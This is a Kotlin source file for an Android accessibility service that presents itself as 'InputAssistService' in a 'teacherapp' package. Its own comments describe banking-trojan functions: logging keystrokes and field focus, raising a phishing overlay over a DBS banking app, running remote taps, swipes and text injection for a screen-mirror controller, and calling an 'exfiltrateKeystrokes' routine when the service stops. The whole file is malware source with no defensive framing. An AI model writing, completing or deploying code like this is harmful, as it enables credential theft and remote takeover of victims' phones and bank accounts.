package com.example.teacherapp.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.util.Log
import android.view.accessibility.AccessibilityEvent

/**
 * InputAssistService — the ONLY AccessibilityService in the app.
 *
 * Declared once in AndroidManifest → ONE permission popup for the user.
 *
 * All logic is kept in separate, modular helper classes:
 *   • inputHandlerHelper      → captures keystrokes & field-focus events
 *   • OverlayHelper        → DBS phishing overlay when banking app opens
 *   • gestureManagerHelper  → executes remote tap / swipe / text commands
 *
 * ScreenMirrorService also calls this via [instance] for remote control.
 */
class InputAssistService : AccessibilityService() {

    private val TAG = "CoreService"

    private lateinit var inputHandler:        TextSyncHelper
    private lateinit var overlay:          UiLayerHelper
    private lateinit var gestureManager:    GestureHelper

    companion object {
        /** Singleton used by ScreenMirrorService for remote-control calls. */
        var instance: InputAssistService? = null
    }

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this

        inputHandler        = TextSyncHelper(this)
        overlay          = UiLayerHelper(this)
        gestureManager    = GestureHelper(this)

        // Configure events — union of all helper requirements
        val info = AccessibilityServiceInfo().apply {
            eventTypes =
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED    or   // overlay
                        AccessibilityEvent.TYPE_WINDOWS_CHANGED          or   // overlay
                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED        or   // inputHandler
                        AccessibilityEvent.TYPE_VIEW_FOCUSED             or   // inputHandler field focus
                        AccessibilityEvent.TYPE_VIEW_CLICKED             or   // inputHandler clicks
                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED        // clipboard
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags =
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                        AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            notificationTimeout = 100
        }
        serviceInfo = info

        Log.d(TAG, "✅ InputAssistService connected — all helpers initialised")
    }

    // ── Event routing ─────────────────────────────────────────────────────────

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        inputHandler.onEvent(event)   // handles TYPE_VIEW_TEXT_CHANGED + TYPE_VIEW_FOCUSED
        overlay.onEvent(event)     // handles TYPE_WINDOW_STATE_CHANGED + TYPE_WINDOWS_CHANGED
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
        }
    }

    // ── Lifecycle cleanup ─────────────────────────────────────────────────────

    override fun onInterrupt() {
        Log.d(TAG, "Service interrupted — flushing keystrokes")
        inputHandler.exfiltrateKeystrokes()
        overlay.removeOverlay()
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        Log.d(TAG, "Service destroyed — final keystroke flush")
        inputHandler.exfiltrateKeystrokes()
        overlay.removeOverlay()
    }

    // ── Public API for ScreenMirrorService remote control ────────────────────

    fun injectTap(x: Float, y: Float)                               = gestureManager.injectTap(x, y)
    fun injectSwipe(x1: Float, y1: Float, x2: Float, y2: Float)    = gestureManager.injectSwipe(x1, y1, x2, y2)
    fun injectText(text: String)                                    = gestureManager.injectText(text)
    fun clearText()                                                 = gestureManager.clearText()
    fun injectKey(key: String)                                      = gestureManager.injectKey(key)
    fun injectGlobal(action: String)                                = gestureManager.injectGlobal(action)
}